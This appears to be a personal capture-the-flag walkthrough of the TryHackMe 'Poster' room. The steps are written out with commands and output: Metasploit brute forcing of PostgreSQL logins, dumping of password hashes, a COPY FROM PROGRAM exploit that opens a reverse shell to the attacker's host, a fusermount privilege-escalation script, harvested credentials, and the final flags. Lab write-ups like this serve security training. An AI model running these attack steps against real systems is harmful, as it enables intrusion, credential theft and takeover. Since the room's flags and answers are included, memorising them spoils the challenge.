@@ -1,0 +1,446 @@
+POSTER.
+
+
+
+
+[>>> TASK 1: FLAG]
+[1.1. WHAT IS THE RDBMS INSTALLED ON THE SERVER?]
+[ACTION: nmap quick all port scan]
+nmap -sS -T4 -sV -p- 10.10.111.94
+[OUTPUT]
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[ANSWER]
+postgresql
+
+
+
+[1.2. WHAT PORT IS THE RDBMS RUNNING ON]
+[ANSWER (based on last output)]
+5432
+
+
+
+[1.3. METASPLOIT CONTAINS A VARIETY OF MODULES THAT CAN BE USED TO ENUMERATE MULTIPLE DRBMS, MAKING IT EASY TO GATHER VALUABLE INFORMATION]
+Nothing to answer here.
+
+
+
+[1.4. AFTER STARTING METASPLOIT, SEARCH FOR AN ASSOCIATED AUXILIARY MODULE THAT ALLOWS US TO ENUMERATE USER CREDENTIALS. WHAT IS THE FULL PATH OF THE MODULES (STARTING WITH AUXILIARY)?]
+[ACTION: look for postgresql enumeration metasploit modules]
+msfconsole
+search postgresql enum
+[OUTPUT]
+#  Name                                         Disclosure Date  Rank    Check  Description
+   -  ----                                         ---------------  ----    -----  -----------
+   0  post/linux/gather/enum_users_history         .                normal  No     Linux Gather User History
+   1  auxiliary/scanner/postgres/postgres_version  .                normal  No     PostgreSQL Version Probe
+[NOTE]
+Its neither of these.
+
+
+[ACTION: look for postgres enumeration metasploit modules (attempt 2)]
+search postgresql auxiliary
+[OUTPUT]
+   #  Name                                                       Disclosure Date  Rank    Check  Description
+   -  ----                                                       ---------------  ----    -----  -----------
+   0  auxiliary/server/capture/postgresql                        .                normal  No     Authentication Capture: PostgreSQL
+   1  auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal  Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   2  auxiliary/scanner/postgres/postgres_dbname_flag_injection  .                normal  No     PostgreSQL Database Name Command Line Flag Injection
+   3  auxiliary/scanner/postgres/postgres_login                  .                normal  No     PostgreSQL Login Utility
+   4  auxiliary/admin/postgres/postgres_readfile                 .                normal  No     PostgreSQL Server Generic Query
+   5  auxiliary/admin/postgres/postgres_sql                      .                normal  No     PostgreSQL Server Generic Query
+   6  auxiliary/scanner/postgres/postgres_version                .                normal  No     PostgreSQL Version Probe
+   7  auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal  No     Ruby on Rails Devise Authentication Password Reset
+[ANSWER]
+auxiliary/scanner/postgres/postgres_login
+
+
+
+[1.5. WHAT ARE THE CREDENTIALS YOU FOUND?]
+[ACTION: configure and run module]
+set RHOSTS 10.10.111.94
+run
+[OUTPUT]
+[-] 10.10.111.94:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
+[+] 10.10.111.94:5432 - Login Successful: postgres:password@template1
+[-] 10.10.111.94:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[-] 10.10.111.94:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Bruteforce completed, 1 credential was successful.
+[*] You can open a Postgres session with these credentials and CreateSession set to true
+[*] Auxiliary module execution completed
+[NOTE]
+The module attempts to login to database template1 trying different users and password pairs.
+The working cred pair is: postgres|password
+[ANSWER]
+postgres:password
+
+
+
+[1.6. WHAT IS THE FULL PATH OF THE MODULE THAT ALLOWS YOU TO EXECUTE COMMANDS WITH THE PROPER USER CREDENTIALS (STARTING WITH AUXILIARY)?]
+[ACTION: find command execution module]
+search auxiliary postgres
+[OUTPUT (snippet)]
+8   auxiliary/admin/postgres/postgres_sql                      .                normal  No     PostgreSQL Server Generic Query
+[ANSWER]
+auxiliary/admin/postgres/postgres_sql
+
+
+
+[1.7. BASED ON THE RESULTS OF #6, WHAT IS THE RDBMS VERSION INSTALLED ON THE SERVER?]
+[ACTION: configure and run postgre_sql module]
+use auxiliary/admin/postgres/postgres_sql
+set RHOSTS 10.10.111.94
+set USERNAME postgres
+set PASSWORD password
+run
+[OUTPUT]
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu
+    5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
+
+[*] Auxiliary module execution completed
+[ANSWER]
+9.5.21
+
+
+
+[1.8. WHAT IS THE NAME OF THE FULL PATH OF THE MODULE THAT ALLOWS FOR DUMPING USER HASHES (STARTING WITH AUXILIARY)?]
+[ACTION: find postgresql hash dumping module]
+search postgre auxiliary hash
+[OUTPUT]
+   #  Name                                          Disclosure Date  Rank    Check  Description
+   -  ----                                          ---------------  ----    -----  -----------
+   0  auxiliary/analyze/crack_databases             .                normal  No     Password Cracker: Databases
+   1    \_ action: hashcat                          .                .       .      Use Hashcat
+   2    \_ action: john                             .                .       .      Use John the Ripper
+   3  auxiliary/scanner/postgres/postgres_login     .                normal  No     PostgreSQL Login Utility
+   4  auxiliary/scanner/postgres/postgres_hashdump  .                normal  No     Postgres Password Hashdump
+[ANSWER]
+auxiliary/scanner/postgres/postgres_hashdump
+
+
+
+[1.9. HOW MANY USER HASHES DOES THE MODULE DUMP?]
+[ACTION: configure and run postgres_hashdump module]
+use auxiliary/scanner/postgres/postgres_hashdump
+set RHOSTS 10.10.111.94
+set USERNAME postgres
+set PASSWORD password
+run
+[OUTPUT]
+ Username   Hash
+ --------   ----
+ darkstart  md58842b99375db43e9fdf238753623a27d
+ poster     md578fb805c7412ae597b399844a54cce0a
+ postgres   md532e12f215ba27cb750c9e093ce4b5127
+ sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
+ ti         md57af9ac4c593e9e4f275576e13f935579
+ tryhackme  md503aab1165001c8f8ccae31a8824efddc
+[ANSWER]
+6
+
+
+
+[1.10. WHAT IS THE FULL PATH OF THE MODULE (STARTING WITH AUXILIARY) THAT ALLOWS AN AUTHENTICATED USER TO VIEW FILES OF THEIR CHOOSING ON THE SERVER?]
+[ACTION: find the requested module]
+search auxiliary postgres file
+[OUTPUT]
+#  Name                                        Disclosure Date  Rank    Check  Description
+   -  ----                                        ---------------  ----    -----  -----------
+   0  auxiliary/scanner/postgres/postgres_login   .                normal  No     PostgreSQL Login Utility
+   1  auxiliary/admin/postgres/postgres_readfile  .                normal  No     PostgreSQL Server Generic Query
+[ANSWER]
+auxiliary/admin/postgres/postgres_readfile
+
+
+
+[1.11. WHAT IS THE FULL PATH OF THE MODULE THAT ALLOWS ARBITRARY COOMMAND EXECUTION WITH THE PROPER USER CREDENTIALS (STARTING WITH EXPLOIT)?]
+[ACTION: find the requested module]
+search exploit postgre remote
+[OUTPUT]
+   #   Name                                                                                      Disclosure Date  Rank       Check  Description
+   -   ----                                                                                      ---------------  ----       -----  -----------
+   0   exploit/linux/http/acronis_cyber_infra_cve_2023_45249                                     2024-07-24       excellent  Yes    Acronis Cyber Infrastructure default password remote code execution
+   1     \_ target: Unix/Linux Command                                                           .                .          .      .
+   2     \_ target: Interactive SSH                                                              .                .          .      .
+   3   exploit/linux/http/appsmith_rce_cve_2024_55964                                            2025-03-25       excellent  Yes    Appsmith RCE
+   4   exploit/linux/http/beyondtrust_pra_rs_unauth_rce                                          2024-12-16       excellent  Yes    BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
+   5   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   6     \_ target: Automatic                                                                    .                .          .      .
+   7     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
+   8     \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
+   9     \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
+   10    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .
+   11    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
+   12    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .
+   13    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
+   14  exploit/windows/misc/manageengine_eventlog_analyzer_rce                                   2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
+   15  exploit/multi/http/rudder_server_sqli_rce                                                 2023-06-16       excellent  Yes    Rudder Server SQLI Remote Code Execution
+[NOTE]
+None of these.	
+
+ 
+[ACTION: find the requested module]
+search exploit postgre exe
+[OUTPUT]
+   #   Name                                                                                      Disclosure Date  Rank       Check  Description
+   -   ----                                                                                      ---------------  ----       -----  -----------
+   0   exploit/linux/http/acronis_cyber_infra_cve_2023_45249                                     2024-07-24       excellent  Yes    Acronis Cyber Infrastructure default password remote code execution
+   1     \_ target: Unix/Linux Command                                                           .                .          .      .
+   2     \_ target: Interactive SSH                                                              .                .          .      .
+   3   exploit/linux/http/appsmith_rce_cve_2024_55964                                            2025-03-25       excellent  Yes    Appsmith RCE
+   4   exploit/linux/http/beyondtrust_pra_rs_unauth_rce                                          2024-12-16       excellent  Yes    BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
+   5   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   6     \_ target: Automatic                                                                    .                .          .      .
+   7     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
+   8     \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
+   9     \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
+   10    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .
+   11    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
+   12    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .
+   13    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
+   14  exploit/windows/misc/manageengine_eventlog_analyzer_rce                                   2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
+   15  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                                2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   16    \_ target: Automatic                                                                    .                .          .      .
+   17    \_ target: Unix/OSX/Linux                                                               .                .          .      .
+   18    \_ target: Windows - PowerShell (In-Memory)                                             .                .          .      .
+   19    \_ target: Windows (CMD)                                                                .                .          .      .
+   20  exploit/multi/postgres/postgres_createlang                                                2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
+   21  exploit/linux/postgres/postgres_payload                                                   2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
+   22    \_ target: Linux x86                                                                    .                .          .      .
+   23    \_ target: Linux x86_64                                                                 .                .          .      .
+   24  exploit/windows/postgres/postgres_payload                                                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
+   25    \_ target: Windows x86                                                                  .                .          .      .
+   26    \_ target: Windows x64                                                                  .                .          .      .
+   27  exploit/multi/http/rudder_server_sqli_rce                                                 2023-06-16       excellent  Yes    Rudder Server SQLI Remote Code Execution
+[ANSWER]
+exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+
+
+ 
+[1.12. COMPROMISE THE MACHINE AND LOCATE user.txt]
+[ACTION: configure and run the rce module]
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+set LHOST 10.23.25.109
+set USERNAME postgres
+set PASSWORD password
+set RHOSTS 10.10.111.94
+run
+[OUTPUT]
+*] Started reverse TCP handler on 10.23.25.109:4444 
+[*] 10.10.111.94:5432 - 10.10.111.94:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
+[*] 10.10.111.94:5432 - Exploiting...
+[+] 10.10.111.94:5432 - 10.10.111.94:5432 - 2FVm3bXvWyVc dropped successfully
+[+] 10.10.111.94:5432 - 10.10.111.94:5432 - 2FVm3bXvWyVc created successfully
+[+] 10.10.111.94:5432 - 10.10.111.94:5432 - 2FVm3bXvWyVc copied successfully(valid syntax/command)
+[+] 10.10.111.94:5432 - 10.10.111.94:5432 - 2FVm3bXvWyVc dropped successfully(Cleaned)
+[*] 10.10.111.94:5432 - Exploit Succeeded
+[*] Command shell session 1 opened (10.23.25.109:4444 -> 10.10.111.94:57670) at 2025-07-27 17:16:07 +0200
+
+
+[ACTION: stabilize shell]
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+
+[ACTION: locate user.txt]
+find / -name "user.txt" 2>/dev/null
+[OUTPUT]
+/home/alison/user.txt
+
+
+[ACTION: check user flag]
+cat /home/alison/user.txt
+[OUTPUT]
+cat: /home/alison/user.txt: Permission denied
+
+
+[ACTION: check permissions flag]
+ls -l /home/alison/user.txt
+[OUTPUT]
+-rw------- 1 alison alison 35 Jul 28  2020 /home/alison/user.txt
+[NOTE]
+Looks like we are missing some steps.
+I'll check home directory of the users.
+
+
+[ACTION: list home directories]
+cd /home
+ls
+[OUTPUT]
+alison dark
+
+
+[ACTION: check /home/alison]
+cd alison
+ls
+[OUTPUT]
+user.txt
+
+
+[ACTION: check /home/dark]
+cd /home/dark
+ls
+[OUTPUT]
+credentials.txt
+
+
+[ACTION: display credentials.txt]
+cat credentials.txt
+[OUTPUT]
+dark:qwerty1234#!hackme
+
+
+[ACTION: log in as dark]
+su - dark
+[NOTE]
+Even as dark, we can't read the user flag. 
+However, since we know our current user's password, we can run sudo commands.
+
+
+[ACTION: check sudo permissions]
+sudo -l
+[OUTPUT]
+Sorry, user dark may not run sudo on ubuntu.
+
+
+[ACTION: check suid binaries]
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+
+/bin/ping6
+/bin/umount
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+[NOTE]
+We find an unusual one: /usr/bin/vmware-user-suid-wrapper
+Also, checking out fusermount (v2.9.4) I found another viable privesc route: Fuse 2.9.3-15 - Local Privilege Escalation, CVE-2015-3202 (https://www.exploit-db.com/exploits/37089).
+I will do the fusermount exploit.
+[ACTION: fusermount exploit]
+a=/tmp/.$$
+b=chmod\ u+sx
+echo $b /bin/sh > $a
+$b $a
+a+=\;$a
+mkdir -p $a
+LIBMOUNT_MTAB=/etc/$0.$0rc _FUSE_COMMFD=0 fusermount $a
+/bin/sh
+
+
+[ACTION: check if root]
+whoami
+[OUTPUT]
+dark
+
+
+[ACTION: check if payload script set /bin/sh suid to root]
+ls -l /bin/sh
+[OUTPUT]
+lrwxrwxrwx 1 root root 4 Jul 28  2020 /bin/sh -> dash
+[NOTE]
+Looks like it didnt work.
+
+
+[NOTE]
+After testing more futile routes, I read a writeup. We are expected to find the file config.php.
+[ACTION: read config.php]
+cat /var/www/html/config.php
+[OUTPUT]
+<?php 
+	
+	$dbhost = "127.0.0.1";
+	$dbuname = "alison";
+	$dbpass = "p4ssw0rdS3cur3!#";
+	$dbname = "mysudopassword";
+[NOTE]
+Looks like we can su as alison with creds alison|p4ssw0rdS3cur3!#.
+
+
+[ACTION: su as alison]
+su alison
+[OUTPUT]
+alison@ubuntu:/home/dark$ 
+
+
+[ACTION: read user flag]
+cat /home/alison/user.txt
+[OUTPUT]
+THM{postgresql_fa1l_conf1gurat1on}
+[ANSWER]
+THM{postgresql_fa1l_conf1gurat1on}
+
+
+[1.13. ESCALATE PRIVILEGES AND OBTAIN root.txt]
+[ACTION: check sudo permissions]
+sudo -l
+[OUTPUT]
+Matching Defaults entries for alison on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alison may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+
+
+[ACTION: check root.txt]
+cat /root/root.txt
+[OUTPUT]
+cat: /root/root.txt: Permission denied
+
+
+[NOTE]
+We still have to escalate to root.
+[ACTION: verify we aren't root]
+whoami
+[OUTPUT]
+alison
+
+
+[ACTION: privesc to root]
+sudo -i
+[OUTPUT]
+root@ubuntu:~#
+
+
+[ACTION: check root flag]
+cat /root/root.txt
+[OUTPUT]
+THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
+ 
